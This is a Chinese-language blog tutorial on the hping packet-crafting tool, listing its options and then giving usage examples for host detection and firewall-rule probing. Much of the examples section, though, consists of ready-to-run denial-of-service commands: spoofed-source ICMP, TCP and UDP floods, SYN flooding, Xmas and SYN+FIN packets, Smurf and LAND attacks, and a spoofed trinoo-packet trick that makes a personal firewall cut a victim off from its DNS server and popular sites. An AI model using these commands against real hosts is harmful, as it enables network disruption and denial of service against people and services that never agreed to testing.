---
title: hping使用方法详解
tags:
  - Linux
  - 技巧
  - hping
  - DDos
  - 工具
categories: hping
abbrlink: 57862
date: 2016-03-15 09:51:54
---

### 一、原理基础

Hping是一个命令行下使用的TCP/IP数据包组装/分析工具，其命令模式很像Unix下的ping命令，但是它不是只能发送ICMP回应请求，它还可以支持TCP、UDP、ICMP和RAW-IP协议，它有一个路由跟踪模式，能够在两个相互包含的通道之间传送文件。Hping常被用于检测网络和主机，其功能非常强大，可在多种操作系统下运行，如Linux，FreeBSD，NetBSD，OpenBSD，Solaris，MacOs X，Windows。

HPING和ping的区别：典型ping程序使用的是ICMP回显请求来测试，而HPING可以使用任何IP报文，包括ICMP、TCP、UDP、RAWSOCKET。

Hping的主要功能有： 

防火墙测试
实用的端口扫描
网络检测，可以用不同的协议、服务类型(TOS)、IP分片
手工探测MTU(最大传输单元)路径
先进的路由跟踪，支持所有的协议
远程操作系统探测
远程的运行时间探测
TCP/IP堆栈审计
<!-- more -->
### 二、安装

- Centos

```bash
yum install hping
```

- Debian/Ubuntu

```bash
apt-get install hping
```

### 三、Hping的详细参数 

> -h --help 显示帮助信息 
> -v --version 显示Hping的版本信息 
> -c --count 指定数据包的次数 
> -i --interval 指定发包间隔为多少毫秒，如-i m10：表示发包间隔为10毫秒(附:秒、毫秒、微秒进率。1s=1000ms(毫秒)=1000000(微秒)，1s=10^3ms(毫秒)=10^6μs(微秒)) 
> --fast 与-i m100等同，即每秒钟发送10个数据包(hping的间隔u表示微妙，－－fast表示快速模式，一秒10个包。) 
> -n --numeric 指定以数字形式输出,表示不进行名称解析。 
> -q --quiet 退出Hping 
> -I --interface 指定IP，如本机有两块网卡，可通过此参数指定发送数据包的IP地址。如果不指定则默认使用网关IP 
> -V --verbose 详细模式,一般显示很多包信息。
> -D --debug 定义hping使用debug模式。 
> -z --bind 将ctrl+z 绑定到ttl，默认使用DST端口 
> -Z --unbind 解除ctrl+z的绑定 
> 
> 指定所用的模式：
> (缺省使用TCP进行PING处理)
> -0 --rawip 裸IP方式,使用RAWSOCKET方式。
> -1 --icmp ICMP 模式 
> -2 --udp UDP 模式 
> -8 --scan 扫描模式. (例: hping --scan 1-30,70-90 -S www.target.host) 
> -9 --listen 监听模式，会接受指定的信息。侦听指定的信息内容。 
> 
> IP选项： 
> 
> -a --spoof 源地址欺骗 
> --rand-dest 随机目的地址模式 
> --rand-source 随机源目的地址模式 
> -t --ttl ttl值，默认为64 
> -N --id 指定id，默认是随机的
> -W --winid 使用win*的id 字节顺序,针对不同的操作系统。 
> -r --rel 相对的id区域 
> -f --frag 将数据包分片后传输(可以通过薄弱的acl(访问控制列表)) 
> -x --morefrag 设置更多的分片标记 
> -y --dontfrag 设置不加分片标记 
> -g --fragoff 设置分片偏移 
> -m --mtu 设置虚拟MTU, 当数据包>MTU时要使用--frag 进行分片 
> -o --tos 指定服务类型，默认是0x00,，可以使用--tos help查看帮助 
> -G --rroute 包含RECORD_ROUTE选项并且显示路由缓存 
> --lsrr 释放源路记录 
> --ssrr 严格的源路由记录 
> -H --ipproto 设置协议范围，仅在RAW IP模式下使用 
> 
> ICMP选项 
> 
> -C --icmptype 指定icmp类型（默认类型为回显请求） 
> -K --icmpcode 指定icmp编码（默认为0） 
> --force-icmp 发送所有ICMP数据包类型（默认只发送可以支持的类型） --icmp-gw 针对ICMP数据包重定向设定网关地址（默认是0.0.0.0） 
> --icmp-ts 相当于--icmp --icmptype 13（ICMP时间戳） 
> --icmp-addr 相当于--icmp --icmptype 17（ICMP地址掩码） 
> --icmp-help 显示ICMP的其它帮助选项 
> 
> UDP/TCP选项 
> 
> -s --baseport 基本源端口（默认是随机的） 
> -p --destport 目的端口（默认为0），可同时指定多个端口 
> -k --keep 仍然保持源端口 
> -w --win 指定数据包大小，默认为64 
> -O --tcpoff 设置假的TCP数据偏移 
> -Q --seqnum 仅显示TCP序列号 
> -b --badcksum 尝试发送不正确IP校验和的数据包(许多系统在发送数据包时使用固定的IP校验和，因此你会得到不正确的UDP/TCP校验和.) 
> -M --setseq 设置TCP序列号 
> -L --setack 使用TCP的ACK（访问控制列表） 
> -F --fin 使用FIN标记set FIN flag 
> -S --syn 使用SNY标记 
> -R --rst 使用RST标记 
> -P --push 使用PUSH标记 
> -A --ack 使用 ACK 标记 
> -U --urg 使用URG标记 
> -X --xmas 使用 X 未用标记 (0x40) 
> -Y --ymas 使用 Y 未用标记 (0x80) 
> --tcpexitcode 最后使用 tcp->th_flags 作为退出代码 
> --tcp-timestamp 启动TCP时间戳选项来猜测运行时间 
> 
> 常规选项 
> 
> -d --data 数据大小，默认为0 
> -E --file 从指定文件中读取数据 
> -e --sign 增加签名 
> -j --dump 以十六进行形式转存数据包 
> -J --print 转存可输出的字符 
> -B --safe 启用安全协议 
> -u --end 当通过- -file指定的文件结束时停止并显示，防止文件再从头开始 
> -T --traceroute 路由跟踪模式 
> --tr-stop 在路由跟踪模式下当收到第一个非ICMP数据包时退出 
> --tr-keep-ttl 保持源TTL，对监测一个hop有用 
> --tr-no-rtt	 使用路由跟踪模式时不计算或显示RTT信息 
> 
> ARS数据包描述(新增加的内容，暂时还不稳定)
> --apd-send 发送用描述APD的数据包
 
### 四、具体应用：

- 每秒送10个(-i u10000)ICMP(-1)封包到www.abc.net.tw 伪造来源IP(-a)为100.100.100.100

```bash
hping www.abc.net.tw -1 -i u100000 -a 100.100.100.100
```

>注：-1为数字非英文L

- 每秒送1个(-i u1000000)TCP(default)封包到www.abc.net.tw的port 44444，伪造来源IP(-a)100.100.100.100使用的port为22222

```bash
hping www.abc.net.tw –i u1000000 –a 100.100.100.100 –s 22222 –p 44444
```

- SYN Flooding(每秒10个封包)

```bash
hping 目标主机IP –i u100000 –S –a 伪造来源IP
```

- 伪造IP的ICMP封包(每秒10个封包)

```bash
hping 目标主机IP –i u100000 –1 –a 伪造来源IP
```

>注：-1为数字非英文

- 不正常TCP Flag组合封包(每秒10个封包)

(a)SYN+FIN

```bash
hping 目标主机IP –i u100000 –S –F –a 伪造来源IP
```

(b)X’mas

```bash
hping 目标主机IP –i u100000 –F –S –R –P –A –U –a 伪造来源IP
```

- 伪造IP的UDP封包

```bash
hping 目标主机IP –i u100000 –2 –a 伪造来源IP
```

- 伪造IP内含CodeRed封包

```bash
hping 目标主机IP –i u100000 –d [封包datasize] –E [filename] –a [伪造来源IP]
```

- SMURF攻击

```bash
hping2 -1 -a 192.168.1.5 192.168.1.255
```

- XMAS TREE攻击

```bash
hping2 -SFRP 192.168.1.5
```

- LAND攻击

```bash
hping2 -k -S -s 25 -p 25 -a 192.168.1.5 192.168.1.5
```

- 用tcpdump记录流量

```bash
#捕获25000个包,将原始报文转储到dumpfile中
cron任务: 5 3 * * * /usr/sbin/tcpdump -c 25000 -w dumpfile -n

#查看记录
tcpdump -r dumpfile -X -vv
```

- PING失效后的主机检测：

```bash
$ping 192.168.2.1
PING 192.168.2.1 (192.168.2.1) 56(84) bytes of data.
--- 192.168.2.1 ping statistics ---
19 packets transmitted, 0 received, 100% packet loss, time 18009ms
－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
$hping2 -c 4 -n -i 2 192.168.2.1
HPING 192.168.2.1 (eth0 192.168.2.1): NO FLAGS are set, 40 headers + 0 data bytes
len=46 ip=192.168.2.1 ttl=64 id=43489 sport=0 flags=RA seq=0 win=0 rtt=1.0 ms
len=46 ip=192.168.2.1 ttl=64 id=43490 sport=0 flags=RA seq=1 win=0 rtt=0.6 ms
len=46 ip=192.168.2.1 ttl=64 id=43491 sport=0 flags=RA seq=2 win=0 rtt=0.7 ms
len=46 ip=192.168.2.1 ttl=64 id=43498 sport=0 flags=RA seq=3 win=0 rtt=0.6 ms
--- 192.168.2.1 hping statistic ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max = 0.6/0.8/1.0 ms
```
-c 发送4个报文-n不进行名称解析 -i包发送时间间隔。

好处：即使主机阻塞了ICMP报文，也可以显示主机是否在运行的信息，在关掉ICMP的探测有效！
显示信息解释：len，返回ip报文大小；ttl； id，IP的ID域；sport，源端口，flags，返回的IP报设置的TCP标志 （R：RESET，A：ACK；S：SYN；F：FIN；P：PUSH；U：URGENT）；seq：序列号；win：tcp窗口大小；rtt：往返 时，EIGRP似乎有这个设置。

- 更复杂的实际的例子

step 1:目标主机安装了blackice，它的ip address是ip.add.of.victim
step 2:发起攻击的一台linux 机器，上面安装了hping

```bash
执行如下命令
#hping -p 31335 -e PONG -2 ip.add.of.victim -c 5 -d 4 -a ip.add.of.dnsserver

HPING ip.add.of.victim (eth0 ip.add.of.victim): udp mode set, 28 headers
+ 4 data bytes
--- ip.add.of.victim hping statistic ---
5 packets tramitted, 0 packets received, 100% packet loss round-trip min/avg/max = 0.0/0.0/0.0 ms

#hping -p 31335 -e PONG -2 ip.add.of.victim -c 5 -d 4 -a www.google.com

HPING ip.add.of.victim (eth0 ip.add.of.victim): udp mode set, 28 headers
+ 4 data bytes
--- ip.add.of.victim hping statistic ---
5 packets tramitted, 0 packets received, 100% packet loss round-trip min/avg/max = 0.0/0.0/0.0 ms

#hping -p 31335 -e PONG -2 ip.add.of.victim -c 5 -d 4 -a www.sina.com
HPING ip.add.of.victim (eth0 ip.add.of.victim): udp mode set, 28 headers
+ 4 data bytes
--- ip.add.of.victim hping statistic ---
5 packets tramitted, 0 packets received, 100% packet loss round-trip min/avg/max = 0.0/0.0/0.0 ms
```

上面的三个命令干了同一件事情，以伪造的ip发送假的trinoo攻击数据包.

结果:在目标主机上所有伪造的ip地址网络连接被block了，也就是对目标主机ip.add.of.victim而言，它的dns服务器，google和sina都无法访问了。
我很怀疑目前的个人防火墙只要存在auto-block功能，就存在这一问题。

- 防火墙规则测试

hping有类似NMAP的方法来检测并收集关于潜在的防火墙的规则和能力的信息。
如果一个主机对ping没有任何相应，而对hping有响应，假定目标的主机为192.168.2.234.
一旦主机对hping作出了响应,那么下一步我们先用nmap先进行一个端口扫描,当然这个hping2也可以作.

```bash
nmap -sT -P0 -p 21-25 192.168.2.234
Starting Nmap 4.53 ( http://insecure.org ) at 2008-08-14 15:56 CST
Interesting ports on 192.168.2.234:
PORT STATE SERVICE
21/tcp filtered ftp
22/tcp open ssh
23/tcp filtered telnet
24/tcp filtered priv-mail
25/tcp filtered smtp
Nmap done: 1 IP address (1 host up) scanned in 1.379 seconds
```

以上信息显示除了ssh端口外,其他端口被阻塞.然后可以试试用hping向各个被阻塞的端口发送空的报文.用-p的开关,可以对指定的目的端口进行hping.

```bash
hping2 -p 21 192.168.2.234
HPING 192.168.2.234 (eth0 192.168.2.234): NO FLAGS are set, 40 headers + 0 data bytes
24: len=46 ip=192.168.2.234 ttl=128 id=2461 sport=24 flags=RA seq=7 win=0 rtt=0.7 ms
len=46 ip=192.168.2.234 ttl=128 id=2462 sport=24 flags=RA seq=8 win=0 rtt=0.7 ms
25: len=46 ip=192.168.2.234 ttl=128 id=2463 sport=25 flags=RA seq=9 win=0 rtt=0.7 ms
len=46 ip=192.168.2.234 ttl=128 id=2464 sport=24 flags=RA seq=10 win=0 rtt=0.7 ms
```

前三个端口没有响应,端口24 25 获得了RST/ACK响应.这说明,虽然这些端口被禁止PING,但没有工具在该端口上监听.然而为什么NMAP没有得到响应,因为NMAP虽然使用 TCP连接,但它在TCP报头中设置了TCP SYN标记位,而HPING 使用了空标记的报文,这就告诉我们说,在主机192.168.2.234上只阻塞进入的TCP连接.接下来使用hping创建一个SYN报文然后将其发送 到5个端口再测试.

```bash
hping2 -S -p 21 192.168.2.234
HPING 192.168.2.234 (eth0 192.168.2.234): S set, 40 headers + 0 data bytes
22: len=46 ip=192.168.2.234 ttl=128 id=10722 sport=22 flags=SA seq=1 win=0 rtt=1.2 ms
len=46 ip=192.168.2.234 ttl=128 id=10747 sport=22 flags=SA seq=2 win=0 rtt=0.7 ms
```

这次只有22端口响应,说明SSH端口是开放的,但有工具在上面监听,该端口没有进行过滤.
然后我们再创建一个ACK报文并发送:

```bash
hping2 -A -p 21 192.168.2.234
HPING 192.168.2.234 (eth0 192.168.2.234): A set, 40 headers + 0 data bytes
22: len=46 ip=192.168.2.234 ttl=128 id=12707 sport=22 flags=R seq=2 win=0 rtt=0.7 ms
len=46 ip=192.168.2.234 ttl=128 id=12708 sport=22 flags=R seq=3 win=0 rtt=0.7 ms
23: len=46 ip=192.168.2.234 ttl=128 id=12709 sport=23 flags=R seq=4 win=0 rtt=0.7 ms
len=46 ip=192.168.2.234 ttl=128 id=12710 sport=22 flags=R seq=5 win=0 rtt=0.7 ms
24: len=46 ip=192.168.2.234 ttl=128 id=12711 sport=24 flags=R seq=6 win=0 rtt=0.7 ms
len=46 ip=192.168.2.234 ttl=128 id=12712 sport=22 flags=R seq=7 win=0 rtt=0.7 ms
25: len=46 ip=192.168.2.234 ttl=128 id=12712 sport=25 flags=R seq=8 win=0 rtt=0.8 ms
len=46 ip=192.168.2.234 ttl=128 id=12713 sport=22 flags=R seq=9 win=0 rtt=0.7 ms
```

结果除了21端口外所有端口都响应了RST,说明了:
1.端口22是开放的,但有工具在上面监听.
2.24 25 上面没有工具监听,对NULL报文回显.
3.端口23针对ACK报文以RST进行了响应,但没有响应NULL报文.说明该端口被过滤,但是telnet服务运行在192.168.2.234上.
4.阻塞了进入的SYN报文但允许其他TCP报文通过,说明它采用的不是基于状态的报文防火墙.